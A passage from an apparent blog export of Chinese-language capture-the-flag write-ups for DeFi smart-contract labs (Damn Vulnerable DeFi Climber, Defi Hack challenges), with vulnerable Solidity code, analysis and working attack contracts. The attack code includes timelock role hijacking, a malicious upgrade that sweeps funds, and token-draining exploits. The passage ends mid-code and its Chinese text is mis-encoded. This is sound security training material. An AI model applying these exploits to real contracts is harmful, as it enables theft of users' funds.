values,bytes[] calldata dataElements,bytes32 salt) external;\n&#125;\ncontract attackclimber &#123;\n    ClimberVault1 public vault;\n    address payable timelock;\n\n    address[] public targets;\n    uint256[] public values;\n    bytes[] public dataElements;\n    bytes32 salt;\n\n    constructor(address _vault, address payable _timelock) &#123;\n        vault = ClimberVault1(_vault);\n        timelock = _timelock;\n    &#125;\n\n    function attack(address attacker) external &#123;\n        targets.push(timelock);\n        targets.push(timelock);\n        targets.push(address(vault));\n        targets.push(address(this));\n        values.push(0);\n        values.push(0);\n        values.push(0);\n        values.push(0);\n\n        bytes memory data = abi.encodeWithSignature(\"updateDelay(uint64)\", uint64(0));\n\n        bytes memory data0 = abi.encodeWithSignature(\n            \"grantRole(bytes32,address)\",\n            keccak256(\"PROPOSER_ROLE\"),\n            address(this)\n        );\n\n        bytes memory data1 = abi.encodeWithSignature(\n            \"transferOwnership(address)\",\n            attacker\n        );\n\n        bytes memory data2 = abi.encodeWithSignature(\"schedule()\");\n\n        dataElements.push(data);\n        dataElements.push(data0);\n        dataElements.push(data1);\n        dataElements.push(data2);\n\n        salt=keccak256(\"66\");\n\n        ClimberTimelock1(timelock).execute(targets, values, dataElements, salt);\n    &#125;\n\n    function schedule() external &#123;\n        ClimberTimelock1(timelock).schedule(targets, values, dataElements, salt);\n    &#125;\n&#125;\n\nupgradecontract\n\n\ninterface Initializable&#123;\n&#125;\ninterface OwnableUpgradeable&#123;\n   \n    \n&#125;\ninterface UUPSUpgradeable&#123;\n    \n    &#125;\ninterface IERC20&#123;\n     function transfer(address to, uint256 amount) external returns (bool);\n     function balanceOf(address account) external view returns (uint256);\n&#125;\ncontract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;\n\n    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;\n    uint256 public constant WAITING_PERIOD = 15 days;\n\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n    modifier initializer()&#123;_;&#125;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer &#123;&#125;\n\n    function initialize() initializer external &#123;\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n    &#125;\n\n    function sweepFunds(address tokenAddress) external  &#123;\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(msg.sender, token.balanceOf(address(this))), \"Transfer failed\");\n    &#125;\n\n    function _authorizeUpgrade(address newImplementation) internal  &#123;\n    &#125;\n     function __Ownable_init() internal&#123;&#125;\n     function __UUPSUpgradeable_init() internal&#123;&#125;\n&#125;\n\nconst attackclimber = await ethers.getContractFactory('attackclimber', attacker);\n        this.attackc = await attackclimber.deploy(this.vault.address, this.timelock.address);\n        await this.attackc.connect(attacker).attack(attacker.address);\n\n        const VaultV2 = await ethers.getContractFactory('UpgradedAttacker', attacker);\n        this.vaultV2 = await VaultV2.deploy();\n        const vaultV2Interface = VaultV2.interface;\n        const data = vaultV2Interface.encodeFunctionData('sweepFunds', [this.token.address]);\n        await this.vault.connect(attacker).upgradeToAndCall(this.vaultV2.address, data);\n\næ€»ç»“è¿™ä¸ªé¢˜åº“åšåˆ°è¿™é‡Œå°±å·²ç»ç»“æŸäº†ï¼Œç›¸æ¯”ä¹‹å‰åšè¿‡çš„å…¶ä»–çš„é¢˜åº“ï¼Œè¿™ä¸ªç³»åˆ—éš¾åº¦è¦æ›´é«˜ä¸€äº›ï¼Œä»£ç å®¡è®¡é‡ä¹Ÿç›¸å¯¹æå‡ã€‚åšèµ·æ¥è¿˜æ˜¯æœ‰äº›å›°éš¾ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†è®¸å¤šæ–°çš„ä¸œè¥¿ã€‚\n","slug":"Damn Vulnerable DeFi","date":"2022-08-02T02:49:20.316Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"68b9de7ae4d5b3763a05a9fb9f649b30","title":"Defi Hack","content":"\n\n\n\né¢˜åº“åœ°å€ï¼šhttps://www.defihack.xyz/\nDefi Hack1.May The Force Be With You\n\n\n\n\n\n\n\n\nRequestA long time ago in a galaxy far, far awayâ€¦ a new DAO was created. Can you steal all the YODA tokens belonging to MayTheForceBeWithYou contract?\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract MayTheForceBeWithYou is ERC20, ReentrancyGuard &#123;\n    using SafeMath for uint256;\n    MiniMeToken public yoda;\n\n    event Withdraw(address indexed beneficiary, uint256 amount);\n    event Deposit(address indexed beneficiary, uint256 amount);\n\n    // Define the Yoda token contract\n    constructor(address _underlying) ERC20(\"xYODA\", \"xYODA\") public &#123;\n        yoda = MiniMeToken(_underlying);\n    &#125;\n\n    function deposit(uint256 amount) external nonReentrant &#123;\n        // Gets the amount of YODA locked in the contract\n        uint256 totalYoda = yoda.balanceOf(address(this));\n        // Gets the amount of xYODA in existence\n        uint256 totalShares = totalSupply();\n        // If no xYODA exists, mint it 1:1 to the amount put in\n        if (totalShares == 0 || totalYoda == 0) &#123;\n            _mint(msg.sender, amount);\n        &#125;\n        // Calculate and mint the amount of xYODA the YODA is worth. The ratio will change overtime, as xYODA is burned/minted and YODA deposited + gained from fees / withdrawn.\n        else &#123;\n            uint256 what = amount.mul(totalShares).div(totalYoda);\n            _mint(msg.sender, what);\n        &#125;\n        // Lock the YODA in the contract\n        yoda.transferFrom(msg.sender, address(this), amount);\n\n        emit Deposit(msg.sender, amount);\n    &#125;\n\n    function withdraw(uint256 numberOfShares) external nonReentrant &#123;\n        // Gets the amount of xYODA in existence\n        uint256 totalShares = totalSupply();\n        // Calculates the amount of YODA the xYODA is worth\n        uint256 what =\n            numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);\n        _burn(msg.sender, numberOfShares);\n        yoda.transfer(msg.sender, what);\n\n        emit Withdraw(msg.sender, what);\n    &#125;\n&#125;\n\ncontract MiniMeToken is Ownable &#123;\n    using SafeMath for uint256;\n\n    string public name;\n    uint8 public decimals;\n    string public symbol;\n\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n    uint256 totalSupply;\n\n    constructor(\n        string memory _tokenName,\n        uint8 _decimalUnits,\n        string memory _tokenSymbol\n    )  public\n    &#123;\n        name = _tokenName;                                 // Set the name\n        decimals = _decimalUnits;                          // Set the decimals\n        symbol = _tokenSymbol;                             // Set the symbol\n    &#125;\n\n\n    function transfer(address _to, uint256 _amount) public returns (bool success) &#123;\n        return doTransfer(msg.sender, _to, _amount);\n    &#125;\n\n\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) &#123;\n        if (allowed[_from][msg.sender] &lt; _amount)\n            return false;\n        allowed[_from][msg.sender] -= _amount;\n        return doTransfer(_from, _to, _amount);\n    &#125;\n\n\n    function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;\n        if (_amount == 0) &#123;\n            return true;\n        &#125;\n        // Do not allow transfer to 0x0 or the token contract itself\n        require((_to != address(0)) &amp;&amp; (_to != address(this)));\n        // If the amount being transfered is more than the balance of the\n        //  account the transfer returns false\n        if (balances[_from] &lt; _amount) &#123;\n            return false;\n        &#125;\n\n        // First update the balance array with the new value for the address\n        //  sending the tokens\n        balances[_from] = balances[_from] - _amount;\n        // Then update the balance array with the new value for the address\n        //  receiving the tokens\n\n        require(balances[_to] + _amount >= balances[_to]); // Check for overflow\n        balances[_to] = balances[_to] + _amount;\n        // An event to make the transfer easy to find on the blockchain\n        Transfer(_from, _to, _amount);\n        return true;\n    &#125;\n\n\n    function approve(address _spender, uint256 _amount) public returns (bool success) &#123;\n        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n\n        allowed[msg.sender][_spender] = _amount;\n        Approval(msg.sender, _spender, _amount);\n        return true;\n    &#125;\n\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) &#123;\n        return allowed[_owner][_spender];\n    &#125;\n\n    function balanceOf(address _owner) public view returns (uint256 balance) &#123;\n      return balances[_owner];\n    &#125;\n\n    function mint(address _owner, uint256 _amount) public onlyOwner &#123;\n      balances[_owner] = _amount;\n      totalSupply += _amount;\n    &#125;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n    event Approval(\n        address indexed _owner,\n        address indexed _spender,\n        uint256 _amount\n      );\n&#125;\n\n\nAnalyzeåˆ†æždepositå‡½æ•°ï¼Œåˆå§‹çŠ¶æ€ä¸‹totalsupplyä¸º0ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€ä¸ªä»»æ„é“¸å¸æ¼æ´žï¼Œæˆ‘ä»¬å¯ä»¥é¢ä»»æ„è¿›è¡Œé“¸å¸ï¼Œä½¿å¾—totalsupplyä¸ä¸º0ï¼Œå³å¯è¿›è¡Œwithdrawå‡½æ•°ï¼Œå†åˆ†æžwithdrawå‡½æ•°æ—¶å‘çŽ°ï¼Œå¯¹äºŽè¾“å…¥çš„numberOfShareså¹¶æ²¡æœ‰é™åˆ¶ï¼Œå¹¶ä¸”whatçš„å€¼æ˜¯ç”±åˆçº¦çš„ä½™é¢è®¡ç®—çš„ï¼Œè¾“å…¥çš„æ•°å€¼è‹¥æ˜¯å’Œtotalsupplyç›¸ç­‰å³å¯ç›¸äº’æŠµæ¶ˆï¼Œä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¶³å¤Ÿçš„ä½™é¢ï¼Œè½¬è´¦ä¸ä¼šæŠ¥é”™å—ï¼Ÿå¾€ä¸‹ç»§ç»­åˆ†æžï¼Œè°ƒç”¨äº†yodaåˆçº¦çš„transferå‡½æ•°ï¼Œtransferå‡½æ•°åˆè°ƒç”¨äº†doTransferå‡½æ•°ï¼Œåœ¨æ­¤å¤„è¿›è¡Œäº†ä½™é¢åˆ¤æ–­ï¼Œä½†æ˜¯é—®é¢˜ä¹Ÿå‘ç”Ÿåœ¨æ­¤ï¼Œä»…ä»…æ˜¯returnä¸€ä¸ªfalseï¼Œè€Œæ²¡æœ‰è¿›è¡Œrequireï¼Œæ‰€ä»¥äº¤æ˜“ä¸ä¼šå›žæ»šï¼Œå³æ²¡æœ‰ä½™é¢ä¹Ÿå¯ä»¥ç›´æŽ¥è½¬è´¦ã€‚æ‰€ä»¥æ€è·¯å‡ºæ¥äº†ï¼Œå…ˆdepositï¼Œå†ä»¥ç›¸åŒçš„å‚æ•°è°ƒç”¨withdrawå‡½æ•°é›†åˆé€šå…³\nAttackawait contract.deposit(100)\nawait contract.withdraw('100')\n\n\n2.DiscoLPRequest\n\n\n\n\n\n\n\n\nDiscoLP is a brand new liquidity mining protocol! You can participate by depositing some JIMBO or JAMBO tokens. All liquidity will be supplied to JIMBO-JAMBO Uniswap pair. By providing liquidity with us you will get DISCO tokens in return!\nYou have 1 JIMBO and 1 JAMBO, can you get at least 100 DISCO tokens?\nCodepragma solidity >=0.6.5;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"./Babylonian.sol\";\n\ncontract DiscoLP is ERC20, Ownable, ReentrancyGuard\n&#123;\n  using SafeERC20 for IERC20;\n\n  address public immutable reserveToken;\n\n  constructor (string memory _name, string memory _symbol, uint8 _decimals, address _reserveToken)\n    ERC20(_name, _symbol) public\n  &#123;\n    _setupDecimals(_decimals);\n    assert(_reserveToken != address(0));\n    reserveToken = _reserveToken;\n    _mint(address(this), 100000 * 10 ** 18); // some inital supply\n  &#125;\n\n  function calcCostFromShares(uint256 _shares) public view returns (uint256 _cost)\n  &#123;\n    return _shares.mul(totalReserve()).div(totalSupply());\n  &#125;\n\n  function totalReserve() public view returns (uint256 _totalReserve)\n  &#123;\n    return IERC20(reserveToken).balanceOf(address(this));\n  &#125;\n\n  // accepts only JIMBO or JAMBO tokens\n  function depositToken(address _token, uint256 _amount, uint256 _minShares) external nonReentrant\n  &#123;\n    address _from = msg.sender;\n    uint256 _minCost = calcCostFromShares(_minShares);\n    if (_amount != 0) &#123;\n      IERC20(_token).safeTransferFrom(_from, address(this), _amount);\n    &#125;\n    uint256 _cost = UniswapV2LiquidityPoolAbstraction._joinPool(reserveToken, _token, _amount, _minCost);\n    uint256 _shares = _cost.mul(totalSupply()).div(totalReserve().sub(_cost));\n    _mint(_from, _shares);\n  &#125;\n&#125;\n\nlibrary UniswapV2LiquidityPoolAbstraction\n&#123;\n  using SafeMath for uint256;\n  using SafeERC20 for IERC20;\n\n  function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)\n  &#123;\n    if (_amount == 0) return 0;\n    address _router = $.UniswapV2_ROUTER02;\n    address _token0 = Pair(_pair).token0();\n    address _token1 = Pair(_pair).token1();\n    address _otherToken = _token == _token0 ? _token1 : _token0;\n    (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();\n    uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);\n    if (_swapAmount == 0) _swapAmount = _amount / 2;\n    uint256 _leftAmount = _amount.sub(_swapAmount);\n    _approveFunds(_token, _router, _amount);\n    address[] memory _path = new address[](2);\n    _path[0] = _token;\n    _path[1] = _otherToken;\n    uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];\n    _approveFunds(_otherToken, _router, _otherAmount);\n    (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));\n    require(_shares >= _minShares, \"high slippage\");\n    return _shares;\n  &#125;\n\n  function _calcSwapOutputFromInput(uint256 _reserveAmount, uint256 _inputAmount) private pure returns (uint256)\n  &#123;\n    return Babylonian.sqrt(_reserveAmount.mul(_inputAmount.mul(3988000).add(_reserveAmount.mul(3988009)))).sub(_reserveAmount.mul(1997)) / 1994;\n  &#125;\n\n  function _approveFunds(address _token, address _to, uint256 _amount) internal\n  &#123;\n    uint256 _allowance = IERC20(_token).allowance(address(this), _to);\n    if (_allowance > _amount) &#123;\n      IERC20(_token).safeDecreaseAllowance(_to, _allowance - _amount);\n    &#125;\n    else\n    if (_allowance &lt; _amount) &#123;\n      IERC20(_token).safeIncreaseAllowance(_to, _amount - _allowance);\n    &#125;\n  &#125;\n&#125;\n\nlibrary $\n&#123;\n  address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n  address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ninterface Router01\n&#123;\n  function WETH() external pure returns (address _token);\n  function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n  function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n  function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n  function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n  function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\ninterface Router02 is Router01\n&#123;\n&#125;\n\ninterface PoolToken is IERC20\n&#123;\n&#125;\n\ninterface Pair is PoolToken\n&#123;\n  function token0() external view returns (address _token0);\n  function token1() external view returns (address _token1);\n  function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n  function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n  function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n  function mint(address _to) external returns (uint256 _liquidity);\n  function sync() external;\n&#125;\n\nAnalyzeå…³äºŽä»€ä¹ˆæ˜¯æµåŠ¨æ€§æŒ–çŸ¿å¯ä»¥å‚è€ƒå¦‚ä¸‹é“¾æŽ¥ï¼Œè®²çš„å¾ˆå½¢è±¡ï¼šhttps://www.zhihu.com/question/449221683\né¢˜ç›®å°±æ˜¯é€šè¿‡æµåŠ¨æ€§æŒ–çŸ¿äº§ç”Ÿdisco tokençš„æ”¶ç›Šï¼Œäº†è§£äº†æµåŠ¨æ€§æŒ–çŸ¿ä¹‹åŽï¼Œå°±æ˜¯è¦åˆ›å»ºäº¤æ˜“å¯¹ä¹Ÿå°±æ˜¯åˆçº¦ä¸­çš„pairï¼Œä»Žè€ŒèŽ·å¾—discoï¼Œè€Œæˆ‘ä»¬åªæœ‰1jimboå’Œ1jamboæƒ³è¦èŽ·å¾—100+çš„discoæ˜¾ç„¶æ˜¯ä¸å¤Ÿçš„ï¼Œä½†æ˜¯åˆ›å»ºä½ çš„äº¤æ˜“å¯¹å¹¶æ²¡æœ‰é™åˆ¶tokenï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±å‘ä¸€ä¸ªtokenå†ä¸Žtokenaè¿›è¡Œäº¤æ˜“å¯¹åˆ›å»ºï¼Œè°ƒç”¨depositTokenèŽ·å–å¾—åˆ°è¶…è¿‡100æµåŠ¨æ€§çš„DISCOï¼Œå†æŠŠèŽ·å–çš„æµåŠ¨æ€§tokenç”±æ”»å‡»è€…åˆçº¦è½¬ç»™playerå³å¯ã€‚\nAttackimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ninterface IUniswapV2Factory &#123;\n  event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n  function getPair(address tokenA, address tokenB) external view returns (address pair);\n  function allPairs(uint) external view returns (address pair);\n  function allPairsLength() external view returns (uint);\n\n  function feeTo() external view returns (address);\n  function feeToSetter() external view returns (address);\n\n  function createPair(address tokenA, address tokenB) external returns (address pair);\n&#125;\n\ninterface IUniswapV2Router &#123;\n\tfunction WETH() external pure returns (address _token);\n\tfunction addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n\tfunction removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n\tfunction swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n\tfunction swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n\tfunction getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\ninterface Pair\n&#123;\n\tfunction token0() external view returns (address _token0);\n\tfunction token1() external view returns (address _token1);\n\tfunction price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n\tfunction price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n\tfunction getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n\tfunction mint(address _to) external returns (uint256 _liquidity);\n\tfunction sync() external;\n&#125;\n\ninterface DiscoLP is IERC20 &#123;\n    function depositToken(address _token, uint256 _amount, uint256 _minShares) external;\n    function calcCostFromShares(uint256 _shares) external view returns (uint256);\n    function totalReserve() external view returns (uint256);\n&#125;\n\nlibrary $\n&#123;\n\taddress constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n\taddress constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ncontract Token is ERC20 &#123;\n    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;\n        _mint(msg.sender, 2**256 - 1);\n    &#125;\n&#125;\n\ncontract Attack &#123;\n    uint256 public balance;\n    function attack (address instance, uint256 amount, address tokenA) public &#123;\n        address _factory = $.UniswapV2_FACTORY;\n        address _router = $.UniswapV2_ROUTER02;\n        Token evil = new Token(\"Evil Token\", \"EVIL\");\n        evil.approve(instance, 2**256 - 1);\n        evil.approve(_router, 2**256 - 1);\n        IERC20(tokenA).approve(_router, 2**256 - 1);\n        address pair = IUniswapV2Factory(_factory).createPair(address(evil), address(tokenA));\n        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(\n          address(evil),\n          address(tokenA),\n          100000000000 * 10 ** 18,\n          1 * 10 ** 18,\n          1, 1, address(this), 2**256 - 1);\n        DiscoLP(instance).depositToken(address(evil), amount, 1);\n        balance = DiscoLP(instance).balanceOf(address(this));\n         DiscoLP(instance).transfer(msg.sender,balance);\n    &#125;\n&#125;\n/**\n * step 1: get reserveToken() on instance\n * step 2: get token0 on Pair(reserveToken)\n * step 3: deploy attack contract\n * step 4: token0.transfer(attack contract, 1 * 10 ** 18)\n * step 5: attack(instance, 1000000000000 * 10 ** 18, token0)\n * step 6ï¼štransfer disco token to player \n */\n\næ”»å‡»æ­¥éª¤å¦‚ä¸Šæ‰€å†™\n\n3.P2PSwapperRequest\n\n\n\n\n\n\n\n\nP2PSwapper is a super convenient zero-trust P2P DEX for any assets! The fee is flat so the whales are welcome! Also, we have a referral program, and all the fees are equally distributed between us and the lead owners.\nWeâ€™ve created a sample trade and deposited some money for it. We wanna make sure you cannot withdraw the fees assigned for our trade.\nYou have to drain all the WETH tokens from the P2PSwapperâ€™s balance.\nCodepragma solidity ^0.6.0;\n\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\nlibrary TransferHelper &#123;\n    function safeApprove(\n        address token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeApprove: approve failed'\n        );\n    &#125;\n\n    function safeTransfer(\n        address token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeTransfer: transfer failed'\n        );\n    &#125;\n\n    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::transferFrom: transferFrom failed'\n        );\n    &#125;\n\n    function safeTransferETH(address to, uint256 value) internal &#123;\n        (bool success, ) = to.call&#123;value: value&#125;(new bytes(0));\n        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');\n    &#125;\n&#125;\n\n\nlibrary SafeMath &#123;\n    function add(uint a, uint b) internal pure returns (uint c) &#123; c = a + b; require(c >= a); &#125;\n    function sub(uint a, uint b) internal pure returns (uint c) &#123; require(a >= b); c = a - b; &#125;\n    function mul(uint a, uint b) internal pure returns (uint c) &#123; c = a * b; require(a == 0 || c / a == b); &#125;\n    function div(uint a, uint b) internal pure returns (uint c) &#123; require(b > 0); c = a / b; &#125;\n&#125;\n\n\ncontract P2P_WETH &#123;\n    using SafeMath for uint;\n    string public name     = \"P2P SwapWrapped Ether\";\n    string public symbol   = \"P2PETH\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n    \n    receive() payable external &#123;\n        deposit();\n    &#125;\n    \n    function deposit() public payable &#123;\n        balanceOf[msg.sender] = balanceOf[msg.sender].add(msg.value);\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n    \n    function withdraw(\n        uint wad\n    ) public &#123;\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(wad);\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n\n    function totalSupply() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n\n    function approve(\n        address guy,\n        uint wad\n    ) public returns (bool) &#123;\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    &#125;\n\n    function transfer(\n        address dst,\n        uint wad\n    ) public returns (bool) &#123;\n        return transferFrom(msg.sender, dst, wad);\n    &#125;\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) &#123;\n        require(balanceOf[src] >= wad);\n        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != uint(2 ** 256-1 )) &#123;\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        &#125;\n        balanceOf[src] = balanceOf[src].sub(wad);\n        balanceOf[dst] = balanceOf[dst].add(wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    &#125;    \n&#125;\n\ninterface IP2P_WETH &#123;\n    function deposit() external payable;\n    function transfer(address to, uint value) external returns (bool);\n    function withdraw(uint) external;\n    function balanceOf(address) external returns (uint);\n    function approve(address,uint) external returns (bool);\n&#125;\n\ncontract P2PSwapper &#123;\n    using SafeMath for uint;\n    \n    struct Deal &#123;\n        address initiator;\n        address bidToken;\n        uint bidPrice;\n        address askToken;\n        uint askAmount;\n        uint status;\n    &#125;\n\n    enum DealState &#123;\n        Active,\n        Succeeded,\n        Canceled,\n        Withdrawn\n    &#125;\n\n    event NewUser(address user, uint id, uint partnerId);\n    event WithdrawFees(address partner, uint userId, uint amount);\n    event NewDeal(address bidToken, uint bidPrice, address askToken, uint askAmount, uint dealId);\n    event TakeDeal(uint dealId, address bidder);\n    event CancelDeal(uint dealId);\n\n    uint public dealCount;\n    mapping(uint => Deal) public deals;\n    mapping(address => uint[]) private _dealHistory;\n    \n    uint public userCount;\n    mapping(uint => uint) public partnerFees;\n    mapping(address => uint) public distributedFees;\n    mapping(uint => uint) public partnerById;\n    mapping(address => uint) public userByAddress;\n    mapping(uint => address) public addressById;\n\n    IP2P_WETH public immutable p2pweth;\n\n    constructor(address weth) public &#123;\n        p2pweth = IP2P_WETH(weth);\n\n        userByAddress[msg.sender] = 1;\n        addressById[1] = msg.sender;\n        partnerById[1] = 1;\n    &#125;\n\n    bool private entered = false;\n    modifier nonReentrant() &#123;\n        require(entered == false, 'P2PSwapper: re-entrancy detected!');\n        entered = true;\n        _;\n        entered = false;\n    &#125;\n\n    function createDeal(\n        address bidToken,\n        uint bidPrice,\n        address askToken,\n        uint askAmount\n    ) external payable returns (uint dealId) &#123;\n        uint fee = msg.value;\n        require(fee > 31337, \"P2PSwapper: fee too low\");\n        p2pweth.deposit&#123;value: msg.value&#125;();\n        partnerFees[userByAddress[msg.sender]] = partnerFees[userByAddress[msg.sender]].add(fee.div(2));\n\n        TransferHelper.safeTransferFrom(bidToken, msg.sender, address(this), bidPrice);\n        dealId = _createDeal(bidToken, bidPrice, askToken, askAmount);\n    &#125;\n\n    function takeDeal(\n        uint dealId\n    ) external nonReentrant &#123;\n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n\n        Deal storage deal = deals[dealId];\n        require(deal.status == 0, \"P2PSwapper: deal not available\");\n\n        TransferHelper.safeTransferFrom(deal.askToken, msg.sender, deal.initiator, deal.askAmount);\n        _takeDeal(dealId);\n    &#125;\n\n    function cancelDeal(\n        uint dealId\n    ) external nonReentrant &#123; \n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n        \n        Deal storage deal = deals[dealId];\n        require(deal.initiator == msg.sender, \"P2PSwapper: access denied\");\n\n        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);\n        \n        deal.status = 2;\n        emit CancelDeal(dealId);\n    &#125;\n\n    function status(\n        uint dealId\n    ) public view returns (DealState) &#123;\n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n        Deal storage deal = deals[dealId];\n        if (deal.status == 1) &#123;\n            return DealState.Succeeded;\n        &#125; else if (deal.status == 2 || deal.status == 3) &#123;\n            return DealState(deal.status);\n        &#125; else &#123;\n            return DealState.Active;\n        &#125;\n    &#125;\n\n    function dealHistory(\n        address user\n    ) public view returns (uint[] memory) &#123;\n        return _dealHistory[user];\n    &#125;\n\n    function signup() public returns (uint) &#123;\n        return signup(1);\n    &#125;\n\n    function signup(uint partnerId) public returns (uint id) &#123;\n        require(userByAddress[msg.sender] == 0, \"P2PSwapper: user exists\");\n        require(addressById[partnerId] != address(0), 